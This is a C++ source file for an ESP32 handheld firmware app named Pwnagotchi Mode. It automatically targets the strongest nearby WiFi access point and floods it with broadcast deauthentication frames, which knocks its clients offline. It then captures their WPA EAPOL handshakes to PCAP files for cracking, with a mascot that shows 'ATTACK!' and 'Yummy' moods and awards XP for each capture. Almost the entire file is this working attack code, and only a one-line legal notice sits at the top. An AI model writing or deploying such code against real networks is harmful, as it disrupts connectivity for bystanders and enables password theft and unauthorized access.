/**
 * @file pwn_mode_app.cpp
 * @brief Pwnagotchi Mode – autonomous handshake capture with AI persona.
 *
 * Implements:
 *  - **Auto-Deauth**: when a strong-signal AP with associated clients is
 *    detected, automatically injects deauthentication frames to force a
 *    WPA handshake.
 *  - **Handshake Sniffer**: listens in promiscuous mode for EAPOL frames
 *    and saves them to `/ext/pwnmode/` in a minimal PCAP format.
 *  - **AI Persona**: the HackBot mascot displays "Hungry" when no APs
 *    are nearby and "Satisfied" after a handshake is captured.
 *  - **Dual-Core**: the capture engine runs as a pinned FreeRTOS task on
 *    Core 0, while the UI continues on Core 1 (Arduino loop).
 *
 * @warning **Legal notice**: Offensive WiFi operations against networks
 * you do not own or have explicit written authorization to test is illegal.
 */

#include "apps/pwn_mode_app.h"

#include <cstdio>
#include <cstring>
#include <new>

#include <esp_log.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

#include "apps/hackos_app.h"
#include "core/event.h"
#include "core/event_system.h"
#include "core/experience_manager.h"
#include "hardware/display.h"
#include "hardware/input.h"
#include "hardware/radio/frame_parser_80211.h"
#include "hardware/wireless.h"
#include "storage/vfs.h"
#include "ui/widgets.h"

static constexpr const char *TAG_PWN = "PwnMode";

namespace
{

// ── Tunables ──────────────────────────────────────────────────────────────────

static constexpr size_t  MAX_PWN_APS          = 16U;
static constexpr int8_t  STRONG_SIGNAL_THRESH = -65;   ///< dBm threshold for auto-deauth
static constexpr uint8_t DEAUTH_BURST_SIZE    = 5U;
static constexpr uint8_t CHANNEL_HOP_MAX      = 13U;
static constexpr uint16_t DEAUTH_REASON       = 7U;    ///< Class-3 from non-associated station
static constexpr size_t  PCAP_SNAP_LEN        = 256U;
static constexpr uint32_t CAPTURE_TASK_STACK   = 4096U;
static constexpr uint8_t  CAPTURE_TASK_PRIO    = 1U;
static constexpr uint32_t CAPTURE_LOOP_MS      = 500U;
static constexpr uint32_t CHANNEL_DWELL_MS     = 2000U; ///< Time per channel while hopping
static constexpr uint32_t TASK_EXIT_GRACE_MS   = 100U;  ///< Extra delay for task exit
static constexpr uint8_t  MAX_AUTO_DEAUTH_BURSTS = 20U; ///< Max deauth bursts per target
static constexpr uint32_t SATISFIED_DISPLAY_TICKS = 50U; ///< Loop iterations to show captured mood

// ── PCAP file header constants (little-endian) ──────────────────────────────

static constexpr uint32_t PCAP_MAGIC      = 0xA1B2C3D4U;
static constexpr uint16_t PCAP_VER_MAJOR  = 2U;
static constexpr uint16_t PCAP_VER_MINOR  = 4U;
static constexpr uint32_t PCAP_LINK_80211 = 105U; ///< LINKTYPE_IEEE802_11

// ── Pwnagotchi state machine ────────────────────────────────────────────────

enum class PwnState : uint8_t
{
    IDLE,       ///< Paused / waiting for user to start
    HUNTING,    ///< Channel hopping, scanning for APs
    ATTACKING,  ///< Sending deauth bursts to a strong-signal AP
    CAPTURED,   ///< Handshake captured – brief celebration
};

// ── AI mood definitions ─────────────────────────────────────────────────────

enum class PwnMood : uint8_t
{
    SLEEPING,    ///< Idle / not running
    HUNGRY,      ///< Hunting, no networks nearby
    LURKING,     ///< Hunting, networks found but no strong targets
    AGGRESSIVE,  ///< Attacking a target
    SATISFIED,   ///< Just captured a handshake
};

static const char *moodString(PwnMood mood)
{
    switch (mood)
    {
    case PwnMood::SLEEPING:   return "Zzz...";
    case PwnMood::HUNGRY:     return "Hungry!";
    case PwnMood::LURKING:    return "Lurking";
    case PwnMood::AGGRESSIVE: return "ATTACK!";
    case PwnMood::SATISFIED:  return "Yummy :)";
    default:                  return "???";
    }
}

static const char *moodFace(PwnMood mood)
{
    switch (mood)
    {
    case PwnMood::SLEEPING:   return "(-.-)";
    case PwnMood::HUNGRY:     return "(>_<)";
    case PwnMood::LURKING:    return "(o_o)";
    case PwnMood::AGGRESSIVE: return "(X_X)";
    case PwnMood::SATISFIED:  return "(^_^)";
    default:                  return "(?.?)";
    }
}

// ── Discovered AP entry ─────────────────────────────────────────────────────

struct PwnAp
{
    uint8_t bssid[6];
    char    ssid[33];
    int8_t  rssi;
    uint8_t channel;
    bool    attacked;    ///< True if we already tried deauth on this AP
    bool    captured;    ///< True if we got a handshake from this AP
};

// ── PCAP structures (packed, little-endian) ─────────────────────────────────

#pragma pack(push, 1)
struct PcapFileHeader
{
    uint32_t magic;
    uint16_t versionMajor;
    uint16_t versionMinor;
    int32_t  thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t linktype;
};

struct PcapPacketHeader
{
    uint32_t tsSec;
    uint32_t tsUsec;
    uint32_t inclLen;
    uint32_t origLen;
};
#pragma pack(pop)

// ── Shared volatile state (capture task → UI task) ──────────────────────────

static volatile uint32_t g_pwnPkts       = 0U;
static volatile uint32_t g_pwnHandshakes = 0U;
static volatile bool     g_captureRunning = false;

// Forward declarations
class PwnModeApp;
static PwnModeApp *g_pwnInstance = nullptr;

static void pwnPromiscuousRxCb(void *buf, wifi_promiscuous_pkt_type_t type);
static void pwnCaptureTask(void *param);

// ── PwnMode App class ───────────────────────────────────────────────────────

class PwnModeApp final : public hackos::HackOSApp
{
public:
    PwnModeApp()
        : statusBar_(0, 0, 128, 8),
          state_(PwnState::IDLE),
          mood_(PwnMood::SLEEPING),
          needsRedraw_(true),
          discoveredCount_(0U),
          currentChannel_(1U),
          lastChannelHopMs_(0U),
          deauthTarget_(0U),
          deauthBurstsSent_(0U),
          totalInjected_(0U),
          satisfiedTimer_(0U),
          captureTaskHandle_(nullptr),
          promiscActive_(false),
          pcapOpen_(false)
    {
        std::memset(discoveredAps_, 0, sizeof(discoveredAps_));
    }

    // ── Called from capture task (Core 0) or promiscuous callback ──────

    void hopChannel()
    {
        const uint32_t now = static_cast<uint32_t>(xTaskGetTickCount() *
                                                    portTICK_PERIOD_MS);
        if ((now - lastChannelHopMs_) < CHANNEL_DWELL_MS)
        {
            return;
        }

        currentChannel_ = static_cast<uint8_t>(
            (currentChannel_ % CHANNEL_HOP_MAX) + 1U);
        (void)esp_wifi_set_channel(currentChannel_, WIFI_SECOND_CHAN_NONE);
        lastChannelHopMs_ = now;
    }

    // ── Called from promiscuous callback (WiFi task context) ─────────

    void addPwnAp(const hackos::radio::MgmtFrameInfo &info)
    {
        for (size_t i = 0U; i < discoveredCount_; ++i)
        {
            if (std::memcmp(discoveredAps_[i].bssid, info.addr3, 6U) == 0)
            {
                discoveredAps_[i].rssi = info.rssi;
                if (info.ssid[0] != '\0')
                {
                    std::memcpy(discoveredAps_[i].ssid, info.ssid, 33U);
                }
                if (info.channel != 0U)
                {
                    discoveredAps_[i].channel = info.channel;
                }
                return;
            }
        }

        if (discoveredCount_ < MAX_PWN_APS)
        {
            PwnAp &ap = discoveredAps_[discoveredCount_];
            std::memcpy(ap.bssid, info.addr3, 6U);
            std::memcpy(ap.ssid, info.ssid, 33U);
            ap.rssi     = info.rssi;
            ap.channel  = info.channel;
            ap.attacked = false;
            ap.captured = false;
            ++discoveredCount_;
        }
    }

    void onEapolDetected(const uint8_t *payload, size_t len)
    {
        ++g_pwnHandshakes;
        writePcapPacket(payload, len);

        // Mark current target as captured
        if (deauthTarget_ < discoveredCount_)
        {
            discoveredAps_[deauthTarget_].captured = true;
        }
    }

protected:
    // ── HackOSApp lifecycle ─────────────────────────────────────────

    void on_alloc() override {}

    void on_start() override
    {
        statusBar_.setConnectivity(false, false);
        statusBar_.setBatteryLevel(100U);
        statusBar_.setTime(0U, 0U);

        (void)Wireless::instance().init();

        g_pwnInstance = this;
        state_ = PwnState::IDLE;
        mood_  = PwnMood::SLEEPING;
        needsRedraw_ = true;
        ESP_LOGI(TAG_PWN, "PwnMode app started");
    }

    void on_event(Event *event) override
    {
        if (event == nullptr || event->type != EventType::EVT_INPUT)
        {
            return;
        }

        const auto input = static_cast<InputManager::InputEvent>(event->arg0);
        handleInput(input);
    }

    void on_update() override
    {
        switch (state_)
        {
        case PwnState::IDLE:
            break;
        case PwnState::HUNTING:
            updateHunting();
            break;
        case PwnState::ATTACKING:
            updateAttacking();
            break;
        case PwnState::CAPTURED:
            updateCaptured();
            break;
        }

        updateMood();
        needsRedraw_ = true;
    }

    void on_draw() override
    {
        if (!needsRedraw_ && !statusBar_.isDirty())
        {
            return;
        }

        DisplayManager::instance().clear();
        statusBar_.draw();

        drawTitle("PwnMode");
        drawPwnFace();
        drawStats();
        drawStateInfo();

        DisplayManager::instance().present();
        statusBar_.clearDirty();
        needsRedraw_ = false;
    }

    void on_free() override
    {
        stopCaptureEngine();
        closePcap();
        g_pwnInstance = nullptr;
        Wireless::instance().deinit();
        ESP_LOGI(TAG_PWN, "PwnMode app freed");
    }

private:
    StatusBar statusBar_;

    PwnState state_;
    PwnMood  mood_;
    bool     needsRedraw_;

    PwnAp    discoveredAps_[MAX_PWN_APS];
    size_t   discoveredCount_;
    uint8_t  currentChannel_;
    uint32_t lastChannelHopMs_;

    size_t   deauthTarget_;
    uint32_t deauthBurstsSent_;
    uint32_t totalInjected_;
    uint32_t satisfiedTimer_;

    TaskHandle_t captureTaskHandle_;
    bool promiscActive_;
    bool pcapOpen_;

    // ── Drawing helpers ─────────────────────────────────────────────

    void drawTitle(const char *title)
    {
        DisplayManager::instance().drawText(2, 10, title);
        DisplayManager::instance().drawLine(0, 18, 127, 18);
    }

    void drawPwnFace()
    {
        // Large face in the center-right area
        DisplayManager::instance().drawText(80, 22, moodFace(mood_), 1U);
        DisplayManager::instance().drawText(72, 32, moodString(mood_), 1U);
    }

    void drawStats()
    {
        char buf[32];

        std::snprintf(buf, sizeof(buf), "APs:%u CH:%u",
                      static_cast<unsigned>(discoveredCount_),
                      static_cast<unsigned>(currentChannel_));
        DisplayManager::instance().drawText(2, 22, buf);

        std::snprintf(buf, sizeof(buf), "Pkts:%lu",
                      static_cast<unsigned long>(g_pwnPkts));
        DisplayManager::instance().drawText(2, 32, buf);

        std::snprintf(buf, sizeof(buf), "HS:%lu Inj:%lu",
                      static_cast<unsigned long>(g_pwnHandshakes),
                      static_cast<unsigned long>(totalInjected_));
        DisplayManager::instance().drawText(2, 42, buf);
    }

    void drawStateInfo()
    {
        const char *stateStr = "";
        switch (state_)
        {
        case PwnState::IDLE:
            stateStr = "[BTN] Start hunting";
            break;
        case PwnState::HUNTING:
            stateStr = "Scanning...  [BTN]Stop";
            break;
        case PwnState::ATTACKING:
        {
            char buf[32];
            const char *ssid = (deauthTarget_ < discoveredCount_ &&
                                discoveredAps_[deauthTarget_].ssid[0] != '\0')
                                   ? discoveredAps_[deauthTarget_].ssid
                                   : "[hidden]";
            std::snprintf(buf, sizeof(buf), "PWN:%.14s", ssid);
            DisplayManager::instance().drawText(2, 54, buf);
            return;
        }
        case PwnState::CAPTURED:
            stateStr = "HANDSHAKE CAPTURED!";
            break;
        }
        DisplayManager::instance().drawText(2, 54, stateStr);
    }

    // ── Input handling ──────────────────────────────────────────────

    void handleInput(InputManager::InputEvent input)
    {
        if (input == InputManager::InputEvent::BUTTON_PRESS)
        {
            switch (state_)
            {
            case PwnState::IDLE:
                startHunting();
                break;
            case PwnState::HUNTING:
            case PwnState::ATTACKING:
            case PwnState::CAPTURED:
                stopCaptureEngine();
                closePcap();
                state_ = PwnState::IDLE;
                mood_  = PwnMood::SLEEPING;
                break;
            }
            needsRedraw_ = true;
        }
        else if (input == InputManager::InputEvent::LEFT)
        {
            if (state_ == PwnState::IDLE)
            {
                // Back to launcher
                stopCaptureEngine();
                closePcap();
                const Event evt{EventType::EVT_SYSTEM, SYSTEM_EVENT_BACK, 0, nullptr};
                EventSystem::instance().postEvent(evt);
            }
        }
    }

    // ── Hunting logic ───────────────────────────────────────────────

    void startHunting()
    {
        discoveredCount_ = 0U;
        std::memset(discoveredAps_, 0, sizeof(discoveredAps_));
        g_pwnPkts       = 0U;
        g_pwnHandshakes = 0U;
        totalInjected_   = 0U;
        deauthBurstsSent_ = 0U;
        currentChannel_  = 1U;
        lastChannelHopMs_ = 0U;

        openPcap();
        startCaptureEngine();

        state_ = PwnState::HUNTING;
        mood_  = PwnMood::HUNGRY;
        ESP_LOGI(TAG_PWN, "Hunting started");
    }

    void updateHunting()
    {
        // Channel hopping is done in the capture task on Core 0.
        // Here we just check if we found a strong target.
        int bestIdx = findBestTarget();
        if (bestIdx >= 0)
        {
            deauthTarget_ = static_cast<size_t>(bestIdx);
            deauthBurstsSent_ = 0U;
            state_ = PwnState::ATTACKING;
            mood_  = PwnMood::AGGRESSIVE;
            ESP_LOGI(TAG_PWN, "Target acquired: %s (CH%u, %ddBm)",
                     discoveredAps_[deauthTarget_].ssid,
                     discoveredAps_[deauthTarget_].channel,
                     discoveredAps_[deauthTarget_].rssi);
        }
    }

    void updateAttacking()
    {
        // Check if handshake was captured since last tick
        if (deauthTarget_ < discoveredCount_ &&
            discoveredAps_[deauthTarget_].captured)
        {
            state_ = PwnState::CAPTURED;
            mood_  = PwnMood::SATISFIED;
            satisfiedTimer_ = SATISFIED_DISPLAY_TICKS;

            // Award XP
            ExperienceManager::instance().addXP(XP_PWN_CAPTURE);
            ESP_LOGI(TAG_PWN, "Handshake captured from %s!",
                     discoveredAps_[deauthTarget_].ssid);
            return;
        }

        // Send deauth bursts (from UI core, quick injection)
        if (deauthBurstsSent_ < MAX_AUTO_DEAUTH_BURSTS && deauthTarget_ < discoveredCount_)
        {
            const PwnAp &ap = discoveredAps_[deauthTarget_];
            (void)esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);

            static constexpr uint8_t BROADCAST[6] = {
                0xFFU, 0xFFU, 0xFFU, 0xFFU, 0xFFU, 0xFFU};

            uint8_t frame[hackos::radio::DEAUTH_FRAME_LEN];
            const size_t frameLen = hackos::radio::buildDeauthFrame(
                frame, ap.bssid, BROADCAST, DEAUTH_REASON);

            if (frameLen > 0U)
            {
                for (uint8_t i = 0U; i < DEAUTH_BURST_SIZE; ++i)
                {
                    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, frameLen, false) == ESP_OK)
                    {
                        ++totalInjected_;
                    }
                }
            }
            ++deauthBurstsSent_;
        }
        else
        {
            // Exhausted deauth bursts without capturing – mark and move on
            discoveredAps_[deauthTarget_].attacked = true;
            state_ = PwnState::HUNTING;
            mood_  = PwnMood::LURKING;
        }
    }

    void updateCaptured()
    {
        if (satisfiedTimer_ > 0U)
        {
            --satisfiedTimer_;
        }
        else
        {
            // Resume hunting for more targets
            discoveredAps_[deauthTarget_].attacked = true;
            state_ = PwnState::HUNTING;
            mood_  = PwnMood::LURKING;
        }
    }

    // ── Target selection ────────────────────────────────────────────

    int findBestTarget() const
    {
        int bestIdx = -1;
        int8_t bestRssi = -128;

        for (size_t i = 0U; i < discoveredCount_; ++i)
        {
            const PwnAp &ap = discoveredAps_[i];
            if (ap.attacked || ap.captured)
            {
                continue;
            }
            if (ap.rssi >= STRONG_SIGNAL_THRESH && ap.rssi > bestRssi)
            {
                bestRssi = ap.rssi;
                bestIdx  = static_cast<int>(i);
            }
        }
        return bestIdx;
    }

    // ── Mood update ─────────────────────────────────────────────────

    void updateMood()
    {
        if (state_ == PwnState::IDLE)
        {
            mood_ = PwnMood::SLEEPING;
            return;
        }
        if (state_ == PwnState::CAPTURED)
        {
            mood_ = PwnMood::SATISFIED;
            return;
        }
        if (state_ == PwnState::ATTACKING)
        {
            mood_ = PwnMood::AGGRESSIVE;
            return;
        }

        // Hunting state – mood depends on what we see
        if (discoveredCount_ == 0U)
        {
            mood_ = PwnMood::HUNGRY;
        }
        else
        {
            mood_ = PwnMood::LURKING;
        }
    }

    // ── Capture engine (Core 0 FreeRTOS task) ───────────────────────

    void startCaptureEngine()
    {
        if (captureTaskHandle_ != nullptr)
        {
            return;
        }

        startPromiscuous();

        g_captureRunning = true;
        xTaskCreatePinnedToCore(
            pwnCaptureTask,
            "pwn_capture",
            CAPTURE_TASK_STACK,
            this,
            CAPTURE_TASK_PRIO,
            &captureTaskHandle_,
            0  // Pin to Core 0
        );
        ESP_LOGI(TAG_PWN, "Capture task pinned to Core 0");
    }

    void stopCaptureEngine()
    {
        g_captureRunning = false;

        if (captureTaskHandle_ != nullptr)
        {
            // Give the task time to exit its loop
            vTaskDelay(pdMS_TO_TICKS(CAPTURE_LOOP_MS + TASK_EXIT_GRACE_MS));
            vTaskDelete(captureTaskHandle_);
            captureTaskHandle_ = nullptr;
            ESP_LOGI(TAG_PWN, "Capture task stopped");
        }

        stopPromiscuous();
    }

    // ── Promiscuous mode ────────────────────────────────────────────

    void startPromiscuous()
    {
        if (promiscActive_)
        {
            return;
        }

        wifi_promiscuous_filter_t filter = {};
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                             WIFI_PROMIS_FILTER_MASK_DATA;

        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous_rx_cb(&pwnPromiscuousRxCb);

        if (esp_wifi_set_promiscuous(true) == ESP_OK)
        {
            promiscActive_ = true;
            statusBar_.setConnectivity(false, true);
            ESP_LOGI(TAG_PWN, "Promiscuous mode enabled");
        }
    }

    void stopPromiscuous()
    {
        if (!promiscActive_)
        {
            return;
        }

        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        promiscActive_ = false;
        statusBar_.setConnectivity(false, false);
        ESP_LOGI(TAG_PWN, "Promiscuous mode disabled");
    }

    // ── PCAP file I/O ───────────────────────────────────────────────

    void openPcap()
    {
        if (pcapOpen_)
        {
            return;
        }

        auto &vfs = hackos::storage::VirtualFS::instance();

        // Generate filename with a simple counter to avoid collisions
        char path[64];
        for (uint16_t n = 0U; n < 9999U; ++n)
        {
            std::snprintf(path, sizeof(path), "/ext/pwnmode/pwn_%04u.pcap", n);
            if (!vfs.exists(path))
            {
                break;
            }
        }

        fs::File f = vfs.open(path, "w");
        if (!f)
        {
            ESP_LOGE(TAG_PWN, "Failed to create PCAP: %s", path);
            return;
        }

        // Write PCAP global header
        PcapFileHeader hdr = {};
        hdr.magic        = PCAP_MAGIC;
        hdr.versionMajor = PCAP_VER_MAJOR;
        hdr.versionMinor = PCAP_VER_MINOR;
        hdr.thiszone     = 0;
        hdr.sigfigs      = 0U;
        hdr.snaplen      = PCAP_SNAP_LEN;
        hdr.linktype     = PCAP_LINK_80211;

        f.write(reinterpret_cast<const uint8_t *>(&hdr), sizeof(hdr));
        f.close();

        pcapOpen_ = true;
        std::strncpy(pcapPath_, path, sizeof(pcapPath_) - 1U);
        pcapPath_[sizeof(pcapPath_) - 1U] = '\0';
        ESP_LOGI(TAG_PWN, "PCAP opened: %s", pcapPath_);
    }

    void writePcapPacket(const uint8_t *data, size_t len)
    {
        if (!pcapOpen_ || data == nullptr || len == 0U)
        {
            return;
        }

        auto &vfs = hackos::storage::VirtualFS::instance();
        fs::File f = vfs.open(pcapPath_, "a");
        if (!f)
        {
            return;
        }

        const uint32_t nowMs = static_cast<uint32_t>(
            xTaskGetTickCount() * portTICK_PERIOD_MS);
        const size_t captureLen = (len > PCAP_SNAP_LEN) ? PCAP_SNAP_LEN : len;

        PcapPacketHeader phdr = {};
        phdr.tsSec   = nowMs / 1000U;
        phdr.tsUsec  = (nowMs % 1000U) * 1000U;
        phdr.inclLen = static_cast<uint32_t>(captureLen);
        phdr.origLen = static_cast<uint32_t>(len);

        f.write(reinterpret_cast<const uint8_t *>(&phdr), sizeof(phdr));
        f.write(data, captureLen);
        f.close();
    }

    void closePcap()
    {
        pcapOpen_ = false;
        ESP_LOGI(TAG_PWN, "PCAP closed");
    }

    char pcapPath_[64] = {};
};

// ── Promiscuous RX callback (runs in WiFi task context) ─────────────────────

static void IRAM_ATTR pwnPromiscuousRxCb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (buf == nullptr || g_pwnInstance == nullptr)
    {
        return;
    }

    const auto *pkt = static_cast<const wifi_promiscuous_pkt_t *>(buf);
    const uint8_t *payload = pkt->payload;
    const size_t   len     = static_cast<size_t>(pkt->rx_ctrl.sig_len);

    ++g_pwnPkts;

    // EAPOL handshake detection on data frames
    if (type == WIFI_PKT_DATA)
    {
        if (hackos::radio::isEapolHandshake(payload, len))
        {
            g_pwnInstance->onEapolDetected(payload, len);
        }
        return;
    }

    // Management frame – store discovered APs
    if (type == WIFI_PKT_MGMT)
    {
        using namespace hackos::radio;
        if (isMgmtFrame(payload, len))
        {
            const MgmtFrameInfo info = parseMgmtFrame(payload, len,
                                                       pkt->rx_ctrl.rssi);
            if (info.valid &&
                (info.subtype == SUBTYPE_BEACON ||
                 info.subtype == SUBTYPE_PROBE_RESP))
            {
                g_pwnInstance->addPwnAp(info);
            }
        }
    }
}

// ── Capture task (pinned to Core 0) ─────────────────────────────────────────

static void pwnCaptureTask(void *param)
{
    auto *app = static_cast<PwnModeApp *>(param);
    (void)app;

    ESP_LOGI(TAG_PWN, "Capture task running on core %d", xPortGetCoreID());

    while (g_captureRunning)
    {
        // Channel hopping when in HUNTING state
        if (g_pwnInstance != nullptr)
        {
            g_pwnInstance->hopChannel();
        }

        vTaskDelay(pdMS_TO_TICKS(CAPTURE_LOOP_MS));
    }

    ESP_LOGI(TAG_PWN, "Capture task exiting");
    vTaskDelete(nullptr);
}

} // namespace

// ── Factory ──────────────────────────────────────────────────────────────────

AppBase *createPwnModeApp()
{
    return new (std::nothrow) PwnModeApp();
}
